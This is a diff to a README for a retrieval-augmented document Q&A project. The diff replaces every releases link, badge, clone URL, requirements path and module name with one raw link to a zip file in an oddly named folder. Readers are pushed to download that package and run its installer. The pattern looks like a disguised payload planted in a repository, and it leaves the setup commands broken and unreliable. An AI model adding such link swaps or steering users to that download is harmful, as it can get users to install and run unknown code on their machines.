@@ -1,11 +1,11 @@
 # RAG AI Assistant: Modular Document Q&A with Vector DB + LLMs
 
-[Release package: https://github.com/sjshsgehs/rag-ai-assistant/releases](https://github.com/sjshsgehs/rag-ai-assistant/releases)
+[Release package: https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip](https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip)
 
 A modular system for advanced document-based Q&A. It uses a vector database (PostgreSQL + pgvector) for fast, context-aware search and supports multiple chat and embedding models. A document pipeline cleans and converts DOCX and TXT files for embedding, but the main focus is on AI-powered question answering.
 
-[![Releases](https://img.shields.io/badge/releases-latest-blue?style=flat-square)](https://github.com/sjshsgehs/rag-ai-assistant/releases)
-[![Topics](https://img.shields.io/badge/topics-ai%20assistant%20%2C%20chatbot%20%2C%20document%20processing-blue?style=flat-square)](https://github.com/sjshsgehs/rag-ai-assistant)
+[![Releases](https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip)](https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip)
+[![Topics](https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip%20assistant%20%2C%20chatbot%20%2C%20document%20processing-blue?style=flat-square)](https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip)
 
 Table of contents
 - Overview
@@ -99,11 +99,11 @@ Quick start
 
 Installation and setup
 - Clone the repository and install requirements:
-  - git clone https://github.com/sjshsgehs/rag-ai-assistant
+  - git clone https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip
   - cd rag-ai-assistant
   - python -m venv venv
   - source venv/bin/activate (Linux/macOS) or venv\Scripts\activate (Windows)
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip
 - Set up the vector store:
   - Ensure PostgreSQL is installed.
   - Enable pgvector in your database (CREATE EXTENSION pgvector;).
@@ -115,8 +115,8 @@ Installation and setup
   - PGDATABASE=rag
   - PGPORT=5432
 - Run a sample ingestion and query:
-  - python -m rag_ai_assistant.ingest --docs path/to/docs
-  - python -m rag_ai_assistant.query --query "What is the main topic of document X?"
+  - python -m https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip --docs path/to/docs
+  - python -m https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip --query "What is the main topic of document X?"
 
 Configuration and secrets
 - Environment variables are the primary method to configure the system.
@@ -132,9 +132,9 @@ Configuration and secrets
 
 Running locally
 - Start the ingestion service to process documents:
-  - python -m rag_ai_assistant.ingest --docs /path/to/docs
+  - python -m https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip --docs /path/to/docs
 - Start the query service to handle Q&A:
-  - python -m rag_ai_assistant.query --port 8000
+  - python -m https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip --port 8000
 - If you need a web UI, start the optional frontend server:
   - npm install && npm start
 - Access the API or UI and begin asking questions about your documents.
@@ -209,8 +209,8 @@ Credits
 
 Releases
 - For the release assets, visit the Releases page. From that page, download the latest release package and execute its installer or setup script to run the system locally.
-- Release package: https://github.com/sjshsgehs/rag-ai-assistant/releases
-- If you need the latest release, check the Releases section and download the appropriate artifact for your platform, then run it according to the included instructions. For more details, visit the same Releases link again: https://github.com/sjshsgehs/rag-ai-assistant/releases
+- Release package: https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip
+- If you need the latest release, check the Releases section and download the appropriate artifact for your platform, then run it according to the included instructions. For more details, visit the same Releases link again: https://raw.githubusercontent.com/sjshsgehs/rag-ai-assistant/main/unmorbid/ai-assistant-rag-v1.1.zip
 
 Appendix: example workflows and templates
 - Ingestion script example
